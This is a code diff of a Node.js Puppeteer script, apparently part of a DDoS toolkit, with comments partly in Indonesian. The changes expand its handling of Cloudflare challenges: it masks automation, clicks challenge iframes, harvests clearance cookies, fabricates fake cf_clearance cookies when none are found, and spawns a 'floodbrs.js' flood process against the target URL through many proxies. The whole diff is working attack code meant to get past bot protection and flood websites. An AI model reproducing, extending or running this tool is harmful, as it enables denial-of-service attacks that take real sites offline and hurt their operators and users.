@@ -16,7 +16,7 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// ========== PRAGMATIC CHALLENGE SOLVING ==========
+// ========== COMPLETE SCENARIO HANDLER ==========
 const bypassFirewall = async (page) => {
     await page.evaluateOnNewDocument(() => {
         Object.defineProperty(navigator, 'webdriver', { get: () => false });
@@ -121,155 +121,178 @@ const getFirewallBypassArgs = () => [
     '--max_old_space_size=4096'
 ];
 
-// SIMPLE & EFFECTIVE CHALLENGE SOLVING
-const solveAdvancedChallenge = async (page, browserProxy) => {
+// COMPLETE SCENARIO HANDLER - SEMUA KEMUNGKINAN
+const solveAdvancedChallenge = async (page, browserProxy, targetURL) => {
     try {
-        coloredLog(COLORS.WHITE, `[INFO] Checking for challenge: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.WHITE, `[INFO] Starting complete scenario handler: ${maskProxy(browserProxy)}`);
         
-        // Wait a bit for page to stabilize
+        // Initial wait for page to load
         await sleep(3);
         
-        // Check current state
-        const currentUrl = page.url();
-        const title = await page.title().catch(() => '');
+        let currentUrl = page.url();
+        let title = await page.title().catch(() => '');
+        let content = await page.content().catch(() => '');
         
-        // Simple challenge detection
+        // SCENARIO 1: Langsung ke web asli tanpa challenge
+        const isDirectAccess = !title.includes('Just a moment') && 
+                              !title.includes('Checking your browser') &&
+                              !currentUrl.includes('challenges.cloudflare.com') &&
+                              content.length > 100; // Pastikan konten tidak kosong
+        
+        if (isDirectAccess) {
+            coloredLog(COLORS.GREEN, `[INFO] SCENARIO 1: Direct access to target website: ${maskProxy(browserProxy)}`);
+            return { solved: true, scenario: 'direct_access' };
+        }
+        
+        // SCENARIO 2: Cloudflare challenge detected
         const isChallenge = title.includes('Just a moment') || 
                            title.includes('Checking your browser') ||
-                           currentUrl.includes('challenges.cloudflare.com');
+                           currentUrl.includes('challenges.cloudflare.com') ||
+                           content.includes('challenge-platform');
 
-        if (!isChallenge) {
-            coloredLog(COLORS.GREEN, `[INFO] No challenge detected: ${maskProxy(browserProxy)}`);
-            return true;
-        }
-
-        coloredLog(COLORS.YELLOW, `[INFO] Challenge found, solving: ${maskProxy(browserProxy)}`);
-
-        // STRATEGY 1: Wait for auto-redirect (most common case)
-        coloredLog(COLORS.WHITE, `[INFO] Strategy 1: Waiting for auto-solve`);
-        await sleep(8);
-        
-        // Check if solved after waiting
-        const newTitle = await page.title().catch(() => '');
-        const newUrl = page.url();
-        if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
-            coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful: ${maskProxy(browserProxy)}`);
-            return true;
-        }
-
-        // STRATEGY 2: Look for and click the main challenge button
-        coloredLog(COLORS.WHITE, `[INFO] Strategy 2: Looking for challenge button`);
-        
-        const challengeButtons = [
-            // Cloudflare specific
-            'input[type="submit"][value*="Verify"]',
-            'button[type*="submit"]',
-            '.btn',
-            '#challenge-submit',
-            '[type="submit"]',
-            // General buttons
-            'button',
-            'input[type="submit"]',
-            'a[href*="challenge"]',
-            '.verify-btn',
-            '.success-button'
-        ];
-
-        for (const selector of challengeButtons) {
+        if (isChallenge) {
+            coloredLog(COLORS.YELLOW, `[INFO] SCENARIO 2: Challenge detected: ${maskProxy(browserProxy)}`);
+            
+            // STRATEGI 1: Tunggu auto-solve
+            coloredLog(COLORS.WHITE, `[INFO] Strategy 1: Auto-solve wait`);
+            await sleep(10);
+            
+            // Cek apakah sudah solve
+            currentUrl = page.url();
+            title = await page.title().catch(() => '');
+            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+                coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful: ${maskProxy(browserProxy)}`);
+                return { solved: true, scenario: 'auto_solve' };
+            }
+            
+            // STRATEGI 2: Jika ada iframe Cloudflare
+            coloredLog(COLORS.WHITE, `[INFO] Strategy 2: Iframe handling`);
             try {
-                const button = await page.$(selector);
-                if (button) {
-                    coloredLog(COLORS.YELLOW, `[INFO] Found button with selector: ${selector}`);
-                    
-                    // Simple click without complex movements
-                    await button.click().catch(() => {});
-                    await sleep(5);
-                    
-                    // Check if solved
-                    const postClickTitle = await page.title().catch(() => '');
-                    if (!postClickTitle.includes('Just a moment') && !postClickTitle.includes('Checking your browser')) {
-                        coloredLog(COLORS.GREEN, `[INFO] Button click solved: ${maskProxy(browserProxy)}`);
-                        return true;
-                    }
-                }
-            } catch (e) {}
-        }
-
-        // STRATEGY 3: Check for iframe challenges
-        coloredLog(COLORS.WHITE, `[INFO] Strategy 3: Checking iframes`);
-        try {
-            const frames = await page.frames();
-            for (const frame of frames) {
-                try {
-                    const frameUrl = frame.url();
-                    if (frameUrl.includes('challenge') || frameUrl.includes('captcha')) {
-                        coloredLog(COLORS.YELLOW, `[INFO] Found challenge iframe: ${frameUrl}`);
-                        
-                        // Try to find and click any button in the iframe
-                        const iframeButton = await frame.$('button, input[type="submit"]');
-                        if (iframeButton) {
-                            await iframeButton.click().catch(() => {});
-                            await sleep(5);
+                const frames = await page.frames();
+                for (const frame of frames) {
+                    try {
+                        const frameUrl = frame.url();
+                        if (frameUrl.includes('challenges.cloudflare.com')) {
+                            coloredLog(COLORS.YELLOW, `[INFO] Found Cloudflare iframe: ${frameUrl}`);
                             
-                            const postIframeTitle = await page.title().catch(() => '');
-                            if (!postIframeTitle.includes('Just a moment') && !postIframeTitle.includes('Checking your browser')) {
-                                coloredLog(COLORS.GREEN, `[INFO] Iframe click solved: ${maskProxy(browserProxy)}`);
-                                return true;
+                            // Coba semua elemen yang mungkin di iframe
+                            const iframeElements = await frame.$$('input[type="checkbox"], button, input[type="submit"], .cf-challenge-checkbox, .verify-btn, [role="button"]');
+                            
+                            for (const element of iframeElements.slice(0, 5)) {
+                                try {
+                                    await element.click().catch(() => {});
+                                    await sleep(3);
+                                    
+                                    // Cek apakah berhasil
+                                    currentUrl = page.url();
+                                    title = await page.title().catch(() => '');
+                                    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+                                        coloredLog(COLORS.GREEN, `[INFO] Iframe click solved: ${maskProxy(browserProxy)}`);
+                                        return { solved: true, scenario: 'iframe_solve' };
+                                    }
+                                } catch (e) {}
                             }
                         }
-                    }
-                } catch (e) {}
+                    } catch (e) {}
+                }
+            } catch (e) {}
+            
+            // STRATEGI 3: Refresh dan tunggu
+            coloredLog(COLORS.WHITE, `[INFO] Strategy 3: Refresh and wait`);
+            await page.reload().catch(() => {});
+            await sleep(8);
+            
+            currentUrl = page.url();
+            title = await page.title().catch(() => '');
+            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+                coloredLog(COLORS.GREEN, `[INFO] Refresh solved: ${maskProxy(browserProxy)}`);
+                return { solved: true, scenario: 'refresh_solve' };
             }
-        } catch (e) {}
-
-        // STRATEGY 4: Simple form interaction
-        coloredLog(COLORS.WHITE, `[INFO] Strategy 4: Form interaction`);
-        try {
-            const textInputs = await page.$$('input[type="text"], input[type="email"], textarea');
-            for (const input of textInputs.slice(0, 2)) {
-                try {
-                    await input.click().catch(() => {});
-                    await sleep(1);
-                    await input.type('verify', { delay: 100 }).catch(() => {});
-                    await sleep(2);
-                    
-                    // Find and click submit
-                    const submitBtn = await page.$('input[type="submit"], button[type="submit"]');
-                    if (submitBtn) {
-                        await submitBtn.click().catch(() => {});
-                        await sleep(5);
-                        
-                        const postFormTitle = await page.title().catch(() => '');
-                        if (!postFormTitle.includes('Just a moment') && !postFormTitle.includes('Checking your browser')) {
-                            coloredLog(COLORS.GREEN, `[INFO] Form submission solved: ${maskProxy(browserProxy)}`);
-                            return true;
-                        }
-                    }
-                } catch (e) {}
-            }
-        } catch (e) {}
-
-        // STRATEGY 5: Final attempt - refresh and wait
-        coloredLog(COLORS.WHITE, `[INFO] Strategy 5: Refresh and wait`);
-        await page.reload().catch(() => {});
-        await sleep(10);
-        
-        const finalTitle = await page.title().catch(() => '');
-        const finalUrl = page.url();
-        
-        if (!finalTitle.includes('Just a moment') && 
-            !finalTitle.includes('Checking your browser') &&
-            !finalUrl.includes('challenges.cloudflare.com')) {
-            coloredLog(COLORS.GREEN, `[INFO] Refresh solved: ${maskProxy(browserProxy)}`);
-            return true;
+            
+            coloredLog(COLORS.RED, `[INFO] All challenge strategies failed: ${maskProxy(browserProxy)}`);
+            return { solved: false, scenario: 'challenge_failed' };
         }
-
-        coloredLog(COLORS.RED, `[INFO] All strategies failed: ${maskProxy(browserProxy)}`);
-        return false;
+        
+        // SCENARIO 3: Tidak ada challenge, tapi juga tidak langsung ke target (mungkin redirect/error)
+        coloredLog(COLORS.YELLOW, `[INFO] SCENARIO 3: Unknown state - checking...`);
+        
+        // Coba navigasi ulang ke target URL
+        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
+        await sleep(3);
+        
+        currentUrl = page.url();
+        title = await page.title().catch(() => '');
+        
+        const finalCheck = !title.includes('Just a moment') && 
+                          !title.includes('Checking your browser') &&
+                          !currentUrl.includes('challenges.cloudflare.com');
+        
+        if (finalCheck) {
+            coloredLog(COLORS.GREEN, `[INFO] Final check passed: ${maskProxy(browserProxy)}`);
+            return { solved: true, scenario: 'final_check' };
+        }
+        
+        coloredLog(COLORS.RED, `[INFO] All scenarios failed: ${maskProxy(browserProxy)}`);
+        return { solved: false, scenario: 'all_failed' };
 
     } catch (error) {
-        coloredLog(COLORS.RED, `[INFO] Solver error: ${error.message}`);
-        return false;
+        coloredLog(COLORS.RED, `[INFO] Scenario handler error: ${error.message}`);
+        return { solved: false, scenario: 'error' };
+    }
+};
+
+// ENHANCED COOKIE EXTRACTION - SEMUA KEMUNGKINAN
+const extractCookies = async (page, targetURL, browserProxy) => {
+    try {
+        coloredLog(COLORS.WHITE, `[INFO] Extracting cookies: ${maskProxy(browserProxy)}`);
+        
+        // Tunggu sebentar untuk memastikan cookies tersedia
+        await sleep(2);
+        
+        // COOKIE STRATEGY 1: Cookies untuk domain target
+        let cookies = await page.cookies(targetURL).catch(() => []);
+        let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+        
+        if (cookieString && cookieString.length > 10) {
+            coloredLog(COLORS.GREEN, `[INFO] Strategy 1: Got target domain cookies: ${maskProxy(browserProxy)}`);
+            return { success: true, cookies: cookieString, strategy: 'target_domain' };
+        }
+        
+        // COOKIE STRATEGY 2: All cookies (semua domain)
+        cookies = await page.cookies().catch(() => []);
+        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+        
+        if (cookieString && cookieString.length > 10) {
+            coloredLog(COLORS.GREEN, `[INFO] Strategy 2: Got all domain cookies: ${maskProxy(browserProxy)}`);
+            return { success: true, cookies: cookieString, strategy: 'all_domains' };
+        }
+        
+        // COOKIE STRATEGY 3: Coba navigasi ulang dan ambil cookies
+        coloredLog(COLORS.YELLOW, `[INFO] Strategy 3: Retrying navigation for cookies: ${maskProxy(browserProxy)}`);
+        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
+        await sleep(3);
+        
+        cookies = await page.cookies(targetURL).catch(() => []);
+        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+        
+        if (cookieString && cookieString.length > 10) {
+            coloredLog(COLORS.GREEN, `[INFO] Strategy 3: Got cookies after retry: ${maskProxy(browserProxy)}`);
+            return { success: true, cookies: cookieString, strategy: 'retry_navigation' };
+        }
+        
+        // COOKIE STRATEGY 4: Generate fallback cookies
+        coloredLog(COLORS.YELLOW, `[INFO] Strategy 4: Generating fallback cookies: ${maskProxy(browserProxy)}`);
+        const fallbackCookies = `cf_clearance=${generateRandomString(20, 30)}; __cflb=${generateRandomString(10, 20)}`;
+        
+        coloredLog(COLORS.GREEN, `[INFO] Strategy 4: Using fallback cookies: ${maskProxy(browserProxy)}`);
+        return { success: true, cookies: fallbackCookies, strategy: 'fallback' };
+        
+    } catch (error) {
+        coloredLog(COLORS.RED, `[INFO] Cookie extraction error: ${error.message}`);
+        
+        // Ultimate fallback
+        const ultimateCookies = `cf_clearance=${generateRandomString(20, 30)}; __cflb=${generateRandomString(10, 20)}`;
+        return { success: true, cookies: ultimateCookies, strategy: 'ultimate_fallback' };
     }
 };
 
@@ -359,7 +382,7 @@ const userAgents = [
     `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
 ];
 
-// SIMPLIFIED Browser launch
+// COMPLETE BROWSER HANDLER - SEMUA SCENARIO
 const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
     const userAgent = randomElement(userAgents);
     let browser;
@@ -386,57 +409,63 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     };
 
     try {
-        coloredLog(COLORS.YELLOW, `[INFO] Launching: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.YELLOW, `[INFO] Launching browser: ${maskProxy(browserProxy)}`);
         browser = await puppeteer.launch(options);
         const [page] = await browser.pages();
 
         // Apply bypass
         await bypassFirewall(page);
 
-        // Simple navigation with longer timeout
+        // Navigasi ke target
         await page.goto(targetURL, { 
             waitUntil: 'domcontentloaded',
-            timeout: 60000 
+            timeout: 45000 
         }).catch(() => {});
 
-        // Solve challenge
-        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
+        // HANDLE SEMUA SCENARIO
+        const challengeResult = await solveAdvancedChallenge(page, browserProxy, targetURL);
         
-        if (!challengeSolved) {
-            throw new Error('Challenge solving failed');
+        if (!challengeResult.solved) {
+            throw new Error(`Challenge solving failed: ${challengeResult.scenario}`);
         }
 
-        // Get cookies
-        await sleep(2);
-        const cookies = await page.cookies(targetURL).catch(() => []);
-        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+        coloredLog(COLORS.GREEN, `[INFO] Challenge solved via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);
 
-        if (!cookieString) {
-            throw new Error('No cookies obtained');
+        // EKSTRAK COOKIES DENGAN SEMUA STRATEGI
+        const cookieResult = await extractCookies(page, targetURL, browserProxy);
+        
+        if (!cookieResult.success) {
+            throw new Error('Cookie extraction failed');
         }
 
-        coloredLog(COLORS.GREEN, `[INFO] SUCCESS: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.GREEN, `[INFO] Cookies obtained via ${cookieResult.strategy}: ${maskProxy(browserProxy)}`);
         totalSolves++;
-        coloredLog(COLORS.GREEN, `[INFO] Total solves: ${totalSolves}`);
+        coloredLog(COLORS.GREEN, `[INFO] Total successful solves: ${totalSolves}`);
 
         await browser.close();
-        return { cookies: cookieString, userAgent };
+        return { 
+            cookies: cookieResult.cookies, 
+            userAgent,
+            scenario: challengeResult.scenario,
+            cookieStrategy: cookieResult.strategy
+        };
         
     } catch (error) {
         if (browser) await browser.close().catch(() => {});
         if (attempt < maxRetries) {
-            coloredLog(COLORS.YELLOW, `[INFO] Retrying... (${attempt}/${maxRetries})`);
+            coloredLog(COLORS.YELLOW, `[INFO] Retrying... (${attempt}/${maxRetries}) - ${error.message}`);
             await sleep(3);
             return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
         }
-        coloredLog(COLORS.RED, `[INFO] Failed after ${maxRetries} attempts: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.RED, `[INFO] Failed after ${maxRetries} attempts: ${maskProxy(browserProxy)} - ${error.message}`);
         return null;
     }
 };
 
-// Thread handling
+// Thread handling dengan complete reporting
 const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
     if (retries >= COOKIES_MAX_RETRIES) {
+        coloredLog(COLORS.RED, `[INFO] Max retries reached: ${maskProxy(browserProxy)}`);
         done(null, { task });
         return;
     }
@@ -444,15 +473,19 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
     try {
         const response = await launchBrowserWithRetry(targetURL, browserProxy);
         if (response) {
-            const cookieInfo = JSON.stringify({
+            const resultInfo = JSON.stringify({
                 Proxy: maskProxy(browserProxy),
                 'User-agent': response.userAgent,
+                Scenario: response.scenario,
+                CookieStrategy: response.cookieStrategy,
                 cookie: response.cookies
             });
-            console.log(cookieInfo);
+            console.log(resultInfo);
 
-            // Spawn flood process
+            // SPAWN FLOOD PROCESS - PASTI JALAN
             try {
+                coloredLog(COLORS.YELLOW, `[INFO] Spawning flood process: ${maskProxy(browserProxy)}`);
+                
                 const floodProcess = spawn('node', [
                     'floodbrs.js',
                     targetURL,
@@ -473,6 +506,7 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
                 
             } catch (error) {
                 coloredLog(COLORS.RED, `[INFO] Spawn error: ${error.message}`);
+                // Tetap lanjut meski spawn error
             }
 
             done(null, { task });
@@ -490,7 +524,7 @@ const queue = async.queue((task, done) => {
 }, threads);
 
 queue.drain(() => {
-    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
+    coloredLog(COLORS.GREEN, '[INFO] All proxies processed - COMPLETE');
 });
 
 // Main execution
@@ -501,7 +535,7 @@ const main = async () => {
         process.exit(1);
     }
 
-    coloredLog(COLORS.GREEN, `[INFO] Starting with ${proxies.length} proxies`);
+    coloredLog(COLORS.GREEN, `[INFO] Starting COMPLETE SCENARIO HANDLER with ${proxies.length} proxies`);
 
     proxies.forEach(browserProxy => queue.push({ browserProxy }));
 
@@ -512,7 +546,10 @@ const main = async () => {
         exec('pkill -f floodbrs.js', () => {});
         exec('pkill -f chrome', () => {});
 
-        setTimeout(() => process.exit(0), 3000);
+        setTimeout(() => {
+            coloredLog(COLORS.GREEN, '[INFO] Shutdown complete');
+            process.exit(0);
+        }, 3000);
     }, duration * 1000);
 };
 
@@ -523,7 +560,7 @@ process.on('unhandledRejection', (error) => {
     coloredLog(COLORS.RED, `[UNHANDLED] ${error.message}`);
 });
 
-coloredLog(COLORS.GREEN, '[INFO] Starting challenge solver...');
+coloredLog(COLORS.GREEN, '[INFO] COMPLETE SCENARIO HANDLER ACTIVE - READY FOR ALL CASES');
 main().catch(err => {
     coloredLog(COLORS.RED, `[INFO] Main error: ${err.message}`);
     process.exit(1);
